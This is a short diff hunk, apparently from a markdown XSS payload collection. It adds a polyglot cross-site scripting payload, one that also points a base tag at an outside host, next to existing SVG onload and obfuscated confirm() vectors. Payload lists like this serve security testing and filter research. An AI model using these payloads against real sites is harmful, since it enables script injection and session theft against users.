@@ -192,6 +192,7 @@
   <style>@keyframes a{}b{animation:a;}</style>
   <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
   <Svg Only=1 OnLoad=confirm(1)>
+  JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
   ```
 </details>
 
